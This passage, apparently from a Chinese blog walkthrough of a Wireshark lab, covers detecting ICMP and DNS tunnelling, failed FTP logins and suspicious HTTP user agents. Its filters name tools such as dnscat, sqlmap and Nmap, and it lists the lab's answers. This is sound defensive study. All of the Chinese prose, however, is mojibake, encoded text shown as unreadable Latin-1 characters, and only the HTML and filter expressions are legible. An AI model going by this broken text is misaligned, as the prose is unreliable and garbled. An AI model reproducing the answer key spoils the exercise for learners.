DoS ) æ”»å‡»ï¼›æ­¤å¤–ï¼Œæ”»å‡»è€…è¿˜ä¼šåˆ©ç”¨å®ƒè¿›è¡Œæ•°æ®çªƒå–å’ŒC2éš§é“æ”»å‡»ã€‚</p>\n<p><strong>ICMPåˆ†æžç®€è¿°ï¼š</strong></p>\n<p>é€šå¸¸ï¼ŒICMPéš§é“æ”»å‡»æ˜¯åœ¨æ¶æ„è½¯ä»¶æ‰§è¡Œæˆ–æ¼æ´žåˆ©ç”¨åŽå‡ºçŽ°çš„å¼‚å¸¸æƒ…å†µã€‚ç”±äºŽICMPæ•°æ®åŒ…å¯ä»¥ä¼ è¾“é¢å¤–çš„æ•°æ®è½½è·ï¼Œæ”»å‡»è€…ä¼šåˆ©ç”¨è¿™ä¸€éƒ¨åˆ†æ¥çªƒå–æ•°æ®å¹¶å»ºç«‹C2è¿žæŽ¥ã€‚è¿™äº›æ•°æ®å¯ä»¥æ˜¯TCPã€HTTPæˆ–SSHæ•°æ®ã€‚ICMPåè®®è™½ç„¶æä¾›äº†æºå¸¦é¢å¤–æ•°æ®çš„ç»ä½³æœºä¼šï¼Œä½†ä¹Ÿå­˜åœ¨ä¸€äº›ç¼ºç‚¹ã€‚å¤§å¤šæ•°ä¼ä¸šç½‘ç»œä¼šé˜»æ­¢è‡ªå®šä¹‰æ•°æ®åŒ…ï¼Œæˆ–è€…è¦æ±‚ç®¡ç†å‘˜æƒé™æ‰èƒ½åˆ›å»ºè‡ªå®šä¹‰ICMPæ•°æ®åŒ…ã€‚</p>\n<p>å¤§é‡çš„ ICMP æµé‡æˆ–å¼‚å¸¸çš„æ•°æ®åŒ…å¤§å°æ˜¯ ICMP éš§é“æ”»å‡»çš„è¿¹è±¡ã€‚ç„¶è€Œï¼Œæ”»å‡»è€…å¯ä»¥åˆ›å»ºä¸Žå¸¸è§„ ICMP æ•°æ®åŒ…å¤§å°ï¼ˆ64 å­—èŠ‚ï¼‰ç›¸åŒ¹é…çš„è‡ªå®šä¹‰æ•°æ®åŒ…ï¼Œå› æ­¤æ£€æµ‹è¿™äº›éš§é“æ”»å‡»æ´»åŠ¨ä»ç„¶ååˆ†å›°éš¾ã€‚ä½†æ˜¯ï¼Œå®‰å…¨åˆ†æžå¸ˆåº”è¯¥äº†è§£æ­£å¸¸å’Œå¼‚å¸¸æƒ…å†µï¼Œä»¥ä¾¿å‘çŽ°å¯èƒ½çš„å¼‚å¸¸å¹¶å°†å…¶ä¸ŠæŠ¥è¿›è¡Œè¿›ä¸€æ­¥åˆ†æžã€‚</p>\n<table>\n<thead>\n<tr>\n<th><strong>ç¬”è®°</strong></th>\n<th><strong>Wiresharkè¿‡æ»¤å™¨</strong></th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>å…¨çƒæœç´¢</td>\n<td>- <code>icmp</code></td>\n</tr>\n<tr>\n<td><strong>â€œICMPâ€é€‰é¡¹ï¼Œç”¨äºŽèŽ·å–å”¾æ‰‹å¯å¾—çš„æˆæžœï¼š</strong><br /><br />- æ•°æ®åŒ…é•¿åº¦ã€‚<br />- ICMP ç›®æ ‡åœ°å€ã€‚<br />- å°è£…åè®®åœ¨ ICMP æœ‰æ•ˆè½½è·ä¸­ç­¾åã€‚</td>\n<td>- <code>data.len &gt; 64 and icmp</code></td>\n</tr>\n<tr>\n<td><img alt=\"\" src=\"https://img2024.cnblogs.com/blog/3392862/202512/3392862-20251229081157013-1769279406.png\" /></td>\n<td></td>\n</tr>\n</tbody>\n</table>\n<h5 id=\"dns-åˆ†æž\">DNS åˆ†æž</h5>\n<p>åŸŸåç³»ç»Ÿ (DNS) æ—¨åœ¨å°† IP åŸŸåè½¬æ¢ä¸º IP åœ°å€ï¼Œå®ƒä¹Ÿè¢«ç§°ä¸ºäº’è”ç½‘çš„ç”µè¯ç°¿ã€‚ç”±äºŽå®ƒæ˜¯ç½‘ç»œæœåŠ¡çš„é‡è¦ç»„æˆéƒ¨åˆ†ï¼Œå› æ­¤è¢«å¹¿æ³›ä½¿ç”¨å’Œä¿¡ä»»ï¼Œä½†ä¹Ÿæ­£å› å¦‚æ­¤ï¼Œå®ƒå¸¸å¸¸è¢«å¿½è§†ã€‚æ­£å› å¦‚æ­¤ï¼Œæ”»å‡»è€…ä¼šåˆ©ç”¨å®ƒè¿›è¡Œæ•°æ®çªƒå–å’Œ C2 æ´»åŠ¨ã€‚</p>\n<p><strong>DNS åˆ†æžç®€è¿°ï¼š</strong></p>\n<p>ä¸Ž ICMP éš§é“ç±»ä¼¼ï¼ŒDNS æ”»å‡»æ˜¯æŒ‡æ¶æ„è½¯ä»¶æ‰§è¡Œæˆ–æ¼æ´žåˆ©ç”¨åŽå‡ºçŽ°çš„å¼‚å¸¸æƒ…å†µã€‚æ”»å‡»è€…ä¼šåˆ›å»ºï¼ˆæˆ–å·²æ‹¥æœ‰ï¼‰ä¸€ä¸ªåŸŸååœ°å€ï¼Œå¹¶å°†å…¶é…ç½®ä¸º C2 é€šé“ã€‚æ¶æ„è½¯ä»¶æˆ–æ¼æ´žåˆ©ç”¨åŽæ‰§è¡Œçš„å‘½ä»¤ä¼šå‘ C2 æœåŠ¡å™¨å‘é€ DNS æŸ¥è¯¢ã€‚ç„¶è€Œï¼Œè¿™äº›æŸ¥è¯¢æ¯”é»˜è®¤çš„ DNS æŸ¥è¯¢æ›´é•¿ï¼Œå¹¶ä¸”æ˜¯é’ˆå¯¹å­åŸŸååœ°å€ç²¾å¿ƒæž„é€ çš„ã€‚ ä¸å¹¸çš„æ˜¯ï¼Œè¿™äº›å­åŸŸååœ°å€å¹¶éžå®žé™…åœ°å€ï¼Œè€Œæ˜¯ç»è¿‡ç¼–ç çš„å‘½ä»¤ï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼š</p>\n<p><strong>\"encoded-commands.maliciousdomain.com\"</strong></p>\n<p>å½“æ­¤æŸ¥è¯¢è¢«è·¯ç”±åˆ°C2æœåŠ¡å™¨æ—¶ï¼ŒæœåŠ¡å™¨ä¼šå°†å®žé™…çš„æ¶æ„å‘½ä»¤å‘é€åˆ°ç›®æ ‡ä¸»æœºã€‚ç”±äºŽDNSæŸ¥è¯¢æ˜¯ç½‘ç»œæ´»åŠ¨çš„è‡ªç„¶ç»„æˆéƒ¨åˆ†ï¼Œè¿™äº›æ•°æ®åŒ…æœ‰å¯èƒ½ä¸è¢«ç½‘ç»œè¾¹ç•Œæ£€æµ‹åˆ°ã€‚å®‰å…¨åˆ†æžå¸ˆåº”è¯¥çŸ¥é“å¦‚ä½•åˆ†æžDNSæ•°æ®åŒ…çš„é•¿åº¦å’Œç›®æ ‡åœ°å€ï¼Œä»¥ä¾¿å‘çŽ°è¿™äº›å¼‚å¸¸æƒ…å†µã€‚</p>\n<table>\n<thead>\n<tr>\n<th><strong>ç¬”è®°</strong></th>\n<th><strong>Wiresharkè¿‡æ»¤å™¨</strong></th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>å…¨çƒæœç´¢</td>\n<td>- <code>dns</code></td>\n</tr>\n<tr>\n<td><strong>åˆ©ç”¨â€œ DNS â€é€‰é¡¹èŽ·å–å”¾æ‰‹å¯å¾—çš„æˆæžœï¼š</strong><br /><br />- æŸ¥è¯¢é•¿åº¦ã€‚<br />- DNSåœ°å€ä¸­çš„å¼‚å¸¸å’Œéžå¸¸è§„åç§°ã€‚<br />- åŒ…å«ç¼–ç å­åŸŸååœ°å€çš„é•¿DNSåœ°å€ã€‚<br />- å·²çŸ¥æ¨¡å¼å¦‚ dnscat å’Œ dns2tcpã€‚<br />- ç»Ÿè®¡åˆ†æžï¼Œä¾‹å¦‚é’ˆå¯¹ç‰¹å®šç›®æ ‡çš„DNSè¯·æ±‚å¼‚å¸¸é‡ã€‚<br /><br /><strong>!mdnsï¼š</strong>ç¦ç”¨æœ¬åœ°é“¾è·¯è®¾å¤‡æŸ¥è¯¢ã€‚</td>\n<td>- <code>dns contains \"dnscat\"</code><br /><br />- <code>dns.qry.name.len &gt; 15 and !mdns</code></td>\n</tr>\n<tr>\n<td><img alt=\"\" src=\"https://img2024.cnblogs.com/blog/3392862/202512/3392862-20251229081155151-413126271.png\" /></td>\n<td></td>\n</tr>\n</tbody>\n</table>\n<hr />\n<p>è°ƒæŸ¥å¼‚å¸¸æ•°æ®åŒ…ã€‚ICMPéš§é“ä½¿ç”¨çš„æ˜¯å“ªç§åè®®ï¼Ÿ<br />\nç­›é€‰ï¼š<code>(data.len &gt; 64) and (icmp contains \"ssh\" or icmp contains \"ftp\" or icmp contains \"tcp\" or icmp contains \"http\")</code><br />\n<img alt=\"\" src=\"https://i-blog.csdnimg.cn/img_convert/9448f154a8546f26aadddfa9c81e0d75.png\" /></p>\n<pre><code class=\"language-pytohn\">ssh\n</code></pre>\n<p>è°ƒæŸ¥å¼‚å¸¸æ•°æ®åŒ…ã€‚æŽ¥æ”¶å¼‚å¸¸DNSæŸ¥è¯¢çš„å¯ç–‘ä¸»åŸŸååœ°å€æ˜¯ä»€ä¹ˆ?<br />\nç­›é€‰ï¼š<code>dns.qry.name.len &gt; 40 and !mdns &amp;&amp; dns.qry.name contains \".com\"</code><br />\nè¿™ä¸ªé•¿åº¦å¯ä»¥æ ¹æ®ä½ çš„è°ƒæŸ¥æ…¢æ…¢è°ƒæ•´å³å¯ï¼Œä¸ä¸€å®šè¯´éžè¦40<br />\n<code>dataexfil[.]com</code><br />\n<img alt=\"\" src=\"https://i-blog.csdnimg.cn/img_convert/067737b9e69e3c31315388f10f08d011.png\" /></p>\n<pre><code class=\"language-python\">dataexfil[.]com\n</code></pre>\n<h4 id=\"æ˜Žæ–‡åè®®åˆ†æžftp\">æ˜Žæ–‡åè®®åˆ†æžï¼šFTP</h4>\n<p>è°ƒæŸ¥æ˜Žæ–‡åè®®è·Ÿè¸ªæ•°æ®å¬èµ·æ¥å¾ˆç®€å•ï¼Œä½†å½“éœ€è¦è°ƒæŸ¥å¤§åž‹ç½‘ç»œè·Ÿè¸ªæ•°æ®ä»¥è¿›è¡Œäº‹ä»¶åˆ†æžå’Œå“åº”æ—¶ï¼Œæƒ…å†µå°±å¤§ä¸ç›¸åŒäº†ã€‚æ­£ç¡®çš„åˆ†æžä¸ä»…ä»…æ˜¯è·Ÿè¸ªæ•°æ®æµå’Œè¯»å–æ˜Žæ–‡æ•°æ®ã€‚å¯¹äºŽå®‰å…¨åˆ†æžå¸ˆæ¥è¯´ï¼Œé‡è¦çš„æ˜¯ä»Žè°ƒæŸ¥è¿‡ç¨‹ä¸­åˆ›å»ºç»Ÿè®¡æ•°æ®å’Œå…³é”®ç»“æžœã€‚æ­£å¦‚ Wireshark ç³»åˆ—æ•™ç¨‹å¼€å¤´æåˆ°çš„ï¼Œåˆ†æžå¸ˆåº”è¯¥å…·å¤‡å®Œæˆè¿™é¡¹å·¥ä½œæ‰€éœ€çš„ç½‘ç»œçŸ¥è¯†å’Œå·¥å…·æŠ€èƒ½ã€‚è®©æˆ‘ä»¬ç”¨ Wireshark æ¨¡æ‹Ÿä¸€æ¬¡æ˜Žæ–‡åè®®è°ƒæŸ¥å§ï¼</p>\n<h5 id=\"ftpåˆ†æž\">FTPåˆ†æž</h5>\n<p>æ–‡ä»¶ä¼ è¾“åè®® ( FTP ) çš„è®¾è®¡åˆè¡·æ˜¯ä¸ºäº†æ–¹ä¾¿æ–‡ä»¶ä¼ è¾“ï¼Œå› æ­¤å®ƒæ›´æ³¨é‡ç®€ä¾¿æ€§è€Œéžå®‰å…¨æ€§ã€‚æ­£å› å¦‚æ­¤ï¼Œåœ¨ä¸å®‰å…¨çš„çŽ¯å¢ƒä¸­ä½¿ç”¨æ­¤åè®®å¯èƒ½ä¼šå¯¼è‡´ä»¥ä¸‹å®‰å…¨é—®é¢˜ï¼š</p>\n<ul>\n<li>ä¸­é—´äººæ”»å‡»</li>\n<li>å‡­è¯çªƒå–å’Œæœªç»æŽˆæƒçš„è®¿é—®</li>\n<li>ç½‘ç»œé’“é±¼</li>\n<li>æ¶æ„è½¯ä»¶æ¤å…¥</li>\n<li>æ•°æ®æ³„éœ²</li>\n</ul>\n<p><strong>FTPåˆ†æžç®€è¿°ï¼š</strong></p>\n<table>\n<thead>\n<tr>\n<th><strong>ç¬”è®°</strong></th>\n<th><strong>Wiresharkè¿‡æ»¤å™¨</strong></th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>å…¨å±€æœç´¢</td>\n<td>- <code>ftp</code></td>\n</tr>\n<tr>\n<td><strong>é€šè¿‡â€œ FTP â€</strong>é€‰é¡¹èŽ·å–å”¾æ‰‹å¯å¾—çš„æˆæžœï¼š<br /><br />- <strong>x1x ç³»åˆ—ï¼š</strong>ä¿¡æ¯è¯·æ±‚å“åº”ã€‚<br />- <strong>x2x ç³»åˆ—ï¼š</strong>è¿žæŽ¥æ¶ˆæ¯ã€‚<br />- <strong>x3x ç³»åˆ—ï¼š</strong>èº«ä»½éªŒè¯æ¶ˆæ¯ã€‚<br /><br /><strong>æ³¨æ„ï¼š</strong> â€œ200â€è¡¨ç¤ºå‘½ä»¤æ‰§è¡ŒæˆåŠŸã€‚</td>\n<td><strong>---</strong></td>\n</tr>\n<tr>\n<td><strong>â€œx1xâ€ç³»åˆ—é€‰é¡¹ï¼ŒåŠ©æ‚¨è½»æ¾æ‘˜å–æžœå®žï¼š</strong><br /><br />- <strong>211ï¼š</strong>ç³»ç»ŸçŠ¶æ€ã€‚<br />- <strong>212ï¼š</strong>ç›®å½•çŠ¶æ€ã€‚<br />- <strong>213ï¼š</strong>æ–‡ä»¶çŠ¶æ€</td>\n<td>- <code>ftp.response.code == 211</code></td>\n</tr>\n<tr>\n<td><strong>â€œx2xâ€ç³»åˆ—é€‰é¡¹ï¼ŒåŠ©æ‚¨è½»æ¾æ‘˜å–æžœå®žï¼š</strong><br /><br />- <strong>220ï¼š</strong>æœåŠ¡å·²å‡†å¤‡å°±ç»ªã€‚<br />- <strong>227ï¼š</strong>è¿›å…¥è¢«åŠ¨æ¨¡å¼ã€‚<br />- <strong>228ï¼š</strong>é•¿æ—¶é—´è¢«åŠ¨æ¨¡å¼ã€‚<br />- <strong>229ï¼š</strong>æ‰©å±•è¢«åŠ¨æ¨¡å¼ã€‚</td>\n<td>- <code>ftp.response.code == 227</code></td>\n</tr>\n<tr>\n<td><strong>â€œx3xâ€ç³»åˆ—é€‰é¡¹ï¼ŒåŠ©æ‚¨è½»æ¾æ‘˜å–æžœå®žï¼š</strong><br /><br />- <strong>230ï¼š</strong>ç”¨æˆ·ç™»å½•ã€‚<br />- <strong>231ï¼š</strong>ç”¨æˆ·æ³¨é”€ã€‚<br />- <strong>331ï¼š</strong>æœ‰æ•ˆçš„ç”¨æˆ·åã€‚<br />- <strong>430ï¼š</strong>ç”¨æˆ·åæˆ–å¯†ç æ— æ•ˆ<br />- <strong>530ï¼š</strong>æ— æ³•ç™»å½•ï¼Œå¯†ç æ— æ•ˆã€‚</td>\n<td>- <code>ftp.response.code == 230</code></td>\n</tr>\n<tr>\n<td><strong>ä½¿ç”¨â€œ FTP â€å‘½ä»¤å¿«é€ŸèŽ·å–æ‰€éœ€èµ„æºï¼š</strong><br /><br />- <strong>ç”¨æˆ·ï¼š</strong>ç”¨æˆ·åã€‚<br />- <strong>å¯†ç ï¼š</strong> PASSã€‚<br />- <strong>CWDï¼š</strong>å½“å‰å·¥ä½œç›®å½•ã€‚<br />- <strong>åˆ—è¡¨ï¼š</strong>åˆ—è¡¨ã€‚</td>\n<td>- <code>ftp.request.command == \"USER\"</code><br /><br />- <code>ftp.request.command == \"PASS\"</code><br /><br />- <code>ftp.request.arg == \"password\"</code></td>\n</tr>\n<tr>\n<td>é«˜çº§ç”¨æ³•ç¤ºä¾‹ï¼šå¦‚ä½•è½»æ¾èŽ·å–å”¾æ‰‹å¯å¾—çš„æˆæžœï¼š<br /><br />- <strong>æš´åŠ›ç ´è§£ä¿¡å·ï¼š</strong>åˆ—å‡ºå¤±è´¥çš„ç™»å½•å°è¯•ã€‚<br />- <strong>æš´åŠ›ç ´è§£ä¿¡å·ï¼š</strong>åˆ—å‡ºç›®æ ‡ç”¨æˆ·åã€‚<br />- <strong>å¯†ç å–·æ´’ä¿¡å·ï¼š</strong>åˆ—å‡ºé™æ€å¯†ç çš„æ”»å‡»ç›®æ ‡ã€‚</td>\n<td>- <code>ftp.response.code == 530</code><br /><br />- <code>(ftp.response.code == 530) and (ftp.response.arg contains \"username\")</code><br /><br />- <code>(ftp.request.command == \"PASS\" ) and (ftp.request.arg == \"password\")</code></td>\n</tr>\n</tbody>\n</table>\n<p><img alt=\"\" src=\"https://i-blog.csdnimg.cn/img_convert/c856abb3b4216221be8294ef148c5963.png\" /></p>\n<hr />\n<p>è¯·å›žç­”ä»¥ä¸‹é—®é¢˜</p>\n<p>æ€»å…±æœ‰å¤šå°‘æ¬¡ç™»å½•é”™è¯¯å°è¯•ï¼Ÿ<br />\nç­›é€‰ï¼š<code>ftp.response.code == 530</code><br />\n<img alt=\"\" src=\"https://i-blog.csdnimg.cn/img_convert/9a9eea0f430c8da3ceaca5515cd5644a.png\" /></p>\n<pre><code class=\"language-python\">737\n</code></pre>\n<p>â€œftpâ€è´¦æˆ·è®¿é—®çš„æ–‡ä»¶å¤§å°æ˜¯å¤šå°‘ï¼Ÿ<br />\nç­›é€‰ï¼š<code>ftp.response.code == 213</code><br />\n<img alt=\"\" src=\"https://i-blog.csdnimg.cn/img_convert/4938707ba5d2477f9c35f0b80c379bc9.png\" /></p>\n<pre><code class=\"language-python\">39424\n</code></pre>\n<p>æ”»å‡»è€…å‘FTPæœåŠ¡å™¨ä¸Šä¼ äº†ä¸€ä¸ªæ–‡æ¡£ã€‚æ–‡ä»¶åæ˜¯ä»€ä¹ˆï¼Ÿ<br />\nç­›é€‰ï¼š<code>ftp.request.command == \"RETR\"</code><br />\n<img alt=\"\" src=\"https://i-blog.csdnimg.cn/img_convert/f1033de1bcfcd64c739b41a0d0f78c58.png\" /></p>\n<pre><code class=\"language-python\">resume.doc\n</code></pre>\n<p>æ”»å‡»è€…è¯•å›¾é€šè¿‡æ·»åŠ ç‰¹æ®Šæ ‡å¿—æ¥æ›´æ”¹ä¸Šä¼ æ–‡ä»¶çš„æ‰§è¡Œæƒé™ã€‚æ”»å‡»è€…ä½¿ç”¨çš„å‘½ä»¤æ˜¯ä»€ä¹ˆï¼Ÿ<br />\nç­›é€‰ï¼š<code>ftp contains \"CHMOD\"</code></p>\n<pre><code class=\"language-python\">CHMOD 777\n</code></pre>\n<h4 id=\"æ˜Žæ–‡åè®®åˆ†æžhttp\">æ˜Žæ–‡åè®®åˆ†æžï¼šHTTP</h4>\n<p>è¶…æ–‡æœ¬ä¼ è¾“â€‹â€‹åè®® ( HTTP ) æ˜¯ä¸€ç§åŸºäºŽæ˜Žæ–‡çš„è¯·æ±‚-å“åº”å¼å®¢æˆ·ç«¯-æœåŠ¡å™¨åè®®ã€‚å®ƒæ˜¯è¯·æ±‚/æä¾›ç½‘é¡µçš„æ ‡å‡†ç½‘ç»œæ´»åŠ¨ç±»åž‹ï¼Œé»˜è®¤æƒ…å†µä¸‹ä¸ä¼šè¢«ä»»ä½•ç½‘ç»œè¾¹ç•Œé˜»æ­¢ã€‚ç”±äºŽå…¶æœªåŠ å¯†ä¸”æ˜¯ç½‘ç»œæµé‡çš„ä¸»å¹²ï¼ŒHTTPæ˜¯æµé‡åˆ†æžä¸­å¿…é¡»äº†è§£çš„åè®®ä¹‹ä¸€ã€‚ä»¥ä¸‹æ”»å‡»å¯ä»¥é€šè¿‡HTTPåˆ†æžæ£€æµ‹åˆ°ï¼š</p>\n<ul>\n<li>é’“é±¼é¡µé¢</li>\n<li>ç½‘ç»œæ”»å‡»</li>\n<li>æ•°æ®æ³„éœ²</li>\n<li>æŒ‡æŒ¥æŽ§åˆ¶æµé‡ï¼ˆC2ï¼‰</li>\n</ul>\n<p><strong>HTTPåˆ†æžç®€è¿°ï¼š</strong></p>\n<table>\n<thead>\n<tr>\n<th><strong>ç¬”è®°</strong></th>\n<th><strong>Wiresharkè¿‡æ»¤å™¨</strong></th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>å…¨çƒæœç´¢<br /><br /><strong>æ³¨ï¼š HTTP2 æ˜¯</strong>HTTPåè®® çš„ä¿®è®¢ç‰ˆï¼Œæ—¨åœ¨æå‡æ€§èƒ½å’Œå®‰å…¨æ€§ã€‚å®ƒæ”¯æŒäºŒè¿›åˆ¶æ•°æ®ä¼ è¾“å’Œè¯·æ±‚/å“åº”å¤ç”¨ã€‚</td>\n<td>- <code>http</code><br /><br />- <code>http2</code></td>\n</tr>\n<tr>\n<td>åˆ©ç”¨â€œHTTP <strong>è¯·æ±‚æ–¹æ³•â€</strong>å¿«é€ŸèŽ·å–æ‰€éœ€èµ„æºï¼š<br /><br />- å¾—åˆ°<br />- é‚®æ”¿<br />- è¯·æ±‚ï¼šåˆ—å‡ºæ‰€æœ‰è¯·æ±‚</td>\n<td>- <code>http.request.method == \"GET\"</code><br /><br />- <code>http.request.method == \"POST\"</code><br /><br />- <code>http.request</code></td>\n</tr>\n<tr>\n<td>åˆ©ç”¨ â€œ HTTP å“åº”çŠ¶æ€ç â€ èŽ·å–å”¾æ‰‹å¯å¾—çš„æˆæžœï¼š<br /><br />- <strong>200 OKï¼š</strong> è¯·æ±‚æˆåŠŸã€‚<br />- <strong>301 æ°¸ä¹…é‡å®šå‘ï¼š</strong> èµ„æºå·²ç§»åŠ¨åˆ°æ–°çš„ URL/è·¯å¾„ï¼ˆæ°¸ä¹…ï¼‰ã€‚<br />- <strong>302 ä¸´æ—¶é‡å®šå‘ï¼š</strong> èµ„æºå·²ç§»åŠ¨åˆ°æ–°çš„ URL/è·¯å¾„ï¼ˆä¸´æ—¶ï¼‰ã€‚<br />- <strong>400 é”™è¯¯è¯·æ±‚ï¼š</strong> æœåŠ¡å™¨æ— æ³•ç†è§£è¯¥è¯·æ±‚ã€‚<br />- <strong>401 æœªæŽˆæƒï¼š</strong> URL éœ€è¦æŽˆæƒï¼ˆç™»å½•ç­‰ï¼‰ã€‚<br />- <strong>403 ç¦æ­¢è®¿é—®ï¼š</strong> æ— æƒè®¿é—®æ‰€è¯·æ±‚çš„ URLã€‚ <br />- <strong>404 Not Foundï¼š</strong> æœåŠ¡å™¨æ‰¾ä¸åˆ°è¯·æ±‚çš„ URLã€‚<br />- <strong>405 æ–¹æ³•ä¸å…è®¸ï¼š</strong> ä½¿ç”¨çš„æ–¹æ³•ä¸åˆé€‚æˆ–å·²è¢«é˜»æ­¢ã€‚<br />- <strong>408 è¯·æ±‚è¶…æ—¶ï¼š</strong>  è¯·æ±‚ç­‰å¾…æ—¶é—´è¶…è¿‡æœåŠ¡å™¨ç­‰å¾…æ—¶é—´ã€‚<br />- <strong>500 å†…éƒ¨æœåŠ¡å™¨é”™è¯¯ï¼š</strong> è¯·æ±‚æœªå®Œæˆï¼Œå‡ºçŽ°æ„å¤–é”™è¯¯ã€‚<br />- <strong>503 æœåŠ¡ä¸å¯ç”¨ï¼š</strong> è¯·æ±‚æœªå®Œæˆï¼ŒæœåŠ¡å™¨æˆ–æœåŠ¡å·²å…³é—­ã€‚</td>\n<td>- <code>http.response.code == 200</code><br /><br />- <code>http.response.code == 401</code><br /><br />- <code>http.response.code == 403</code><br /><br />- <code>http.response.code == 404</code><br /><br />- <code>http.response.code == 405</code><br /><br />- <code>http.response.code == 503</code></td>\n</tr>\n<tr>\n<td><strong>åˆ©ç”¨â€œ HTTP</strong> <strong>å‚æ•°â€å¿«é€ŸèŽ·å–æ‰€éœ€ä¿¡æ¯ï¼š</strong><br /><br />- <strong>ç”¨æˆ·ä»£ç†ï¼š</strong>ç”¨äºŽè¯†åˆ« Web æœåŠ¡å™¨åº”ç”¨ç¨‹åºçš„æµè§ˆå™¨å’Œæ“ä½œç³»ç»Ÿã€‚<br />- <strong>è¯·æ±‚ URIï¼š</strong>æŒ‡å‘æœåŠ¡å™¨ä¸Šè¯·æ±‚çš„èµ„æºã€‚<br />- <strong>å®Œæ•´ URIï¼š</strong>å®Œæ•´çš„ URI ä¿¡æ¯ã€‚<br /><br />*<strong>URIï¼š</strong>ç»Ÿä¸€èµ„æºæ ‡è¯†ç¬¦ã€‚</td>\n<td>- <code>http.user_agent contains \"nmap\"</code><br /><br />- <code>http.request.uri contains \"admin\"</code><br /><br />- <code>http.request.full_uri contains \"admin\"</code></td>\n</tr>\n<tr>\n<td><strong>åˆ©ç”¨â€œ HTTPå‚æ•°â€å¿«é€ŸèŽ·å–æ‰€éœ€ä¿¡æ¯ï¼š</strong><br /><br />- <strong>æœåŠ¡å™¨ï¼š</strong>æœåŠ¡å™¨æœåŠ¡åç§°ã€‚<br />- <strong>ä¸»æœºï¼š</strong>æœåŠ¡å™¨çš„ä¸»æœºå<br />- <strong>è¿žæŽ¥ï¼š</strong>è¿žæŽ¥çŠ¶æ€ã€‚<br />- <strong>åŸºäºŽè¡Œçš„æ–‡æœ¬æ•°æ®ï¼š</strong>æœåŠ¡å™¨æä¾›çš„æ˜Žæ–‡æ•°æ®ã€‚<br />- <strong>HTMLè¡¨å•URLç¼–ç ï¼š</strong>ç½‘é¡µè¡¨å•ä¿¡æ¯ã€‚</td>\n<td>- <code>http.server contains \"apache\"</code><br /><br />- <code>http.host contains \"keyword\"</code><br /><br />- <code>http.host == \"keyword\"</code><br /><br />- <code>http.connection == \"Keep-Alive\"</code><br /><br />- <code>data-text-lines contains \"keyword\"</code></td>\n</tr>\n</tbody>\n</table>\n<h5 id=\"ç”¨æˆ·ä»£ç†åˆ†æž\">ç”¨æˆ·ä»£ç†åˆ†æž</h5>\n<p>ç”±äºŽæ”»å‡»è€…ä¼šä½¿ç”¨å¤æ‚çš„æŠ€æœ¯æ¥å®žæ–½æ”»å‡»ï¼Œä»–ä»¬ä¼šè¯•å›¾é€šè¿‡å·²çŸ¥ä¸”å¯ä¿¡çš„åè®®ç•™ä¸‹ä¸Žæ­£å¸¸æµé‡ç›¸ä¼¼çš„ç—•è¿¹ã€‚å¯¹äºŽå®‰å…¨åˆ†æžå¸ˆè€Œè¨€ï¼Œè¯†åˆ«æ•°æ®åŒ…ä¸­çš„å¼‚å¸¸ä¿¡å·è‡³å…³é‡è¦ã€‚â€œuser-agentâ€å­—æ®µæ˜¯å‘çŽ°HTTPæµé‡å¼‚å¸¸çš„é‡è¦èµ„æºä¹‹ä¸€ã€‚åœ¨æŸäº›æƒ…å†µä¸‹ï¼Œæ”»å‡»è€…ä¼šæˆåŠŸä¿®æ”¹user-agentæ•°æ®ï¼Œä½¿å…¶çœ‹èµ·æ¥éžå¸¸è‡ªç„¶ã€‚å®‰å…¨åˆ†æžå¸ˆä¸èƒ½ä»…ä»…ä¾èµ–user-agentå­—æ®µæ¥å‘çŽ°å¼‚å¸¸ã€‚å³ä½¿user-agentçœ‹èµ·æ¥å¾ˆæ­£å¸¸ï¼Œä¹Ÿæ°¸è¿œä¸è¦å°†å…¶åŠ å…¥ç™½åå•ã€‚åŸºäºŽuser-agentçš„å¼‚å¸¸/å¨èƒæ£€æµ‹/æœå¯»æ˜¯éœ€è¦æ£€æŸ¥çš„é¢å¤–æ•°æ®æ¥æºï¼Œåœ¨å‘çŽ°æ˜Žæ˜¾å¼‚å¸¸æ—¶éžå¸¸æœ‰ç”¨ã€‚å¦‚æžœæ‚¨å¯¹æŸä¸ªå€¼ä¸ç¡®å®šï¼Œå¯ä»¥è¿›è¡Œç½‘ç»œæœç´¢ï¼Œä½¿ç”¨é»˜è®¤çš„æ­£å¸¸user-agentä¿¡æ¯æ¥éªŒè¯æ‚¨çš„å‘çŽ°ï¼ˆä¾‹å¦‚ï¼Œ<a href=\"https://developers.whatismybrowser.com/useragents/explore/\" rel=\"noopener nofollow\" target=\"_blank\"><strong>å‚è€ƒç¤ºä¾‹ç½‘ç«™ï¼šhttps://developers.whatismybrowser.com/useragents/explore/</strong></a>ï¼‰ã€‚</p>\n<p><strong>ç”¨æˆ·ä»£ç†åˆ†æžç®€è¿°ï¼š</strong></p>\n<table>\n<thead>\n<tr>\n<th><strong>ç¬”è®°</strong></th>\n<th><strong>Wiresharkè¿‡æ»¤å™¨</strong></th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>å…¨çƒæœç´¢ã€‚</td>\n<td>- <code>http.user_agent</code></td>\n</tr>\n<tr>\n<td><strong>æ—¨åœ¨èŽ·å–å”¾æ‰‹å¯å¾—æˆæžœçš„ç ”ç©¶æˆæžœï¼š</strong><br /><br />- çŸ­æ—¶é—´å†…æ¥è‡ªåŒä¸€ä¸»æœºçš„ä¸åŒç”¨æˆ·ä»£ç†ä¿¡æ¯ã€‚<br />- éžæ ‡å‡†å’Œè‡ªå®šä¹‰ç”¨æˆ·ä»£ç†ä¿¡æ¯ã€‚<br />- æ‹¼å†™ç•¥æœ‰ä¸åŒã€‚<strong>ï¼ˆâ€œMozillaâ€ä¸Žâ€œMozlillaâ€æˆ–â€œMozlilaâ€å¹¶ä¸ç›¸åŒï¼‰</strong><br />- ç”¨æˆ·ä»£ç†å­—æ®µä¸­åŒ…å« Nmapã€Niktoã€Wfuzz å’Œ sqlmap ç­‰å®¡è®¡å·¥å…·çš„ä¿¡æ¯ã€‚<br />- ç”¨æˆ·ä»£ç†å­—æ®µä¸­çš„æœ‰æ•ˆè½½è·æ•°æ®ã€‚</td>\n<td>- <code>(http.user_agent contains \"sqlmap\") or (http.user_agent contains \"Nmap\") or (http.user_agent contains \"Wfuzz\") or (http.user_agent contains \"Nikto\")</code></td>\n</tr>\n<tr>\n<td><img alt=\"\" 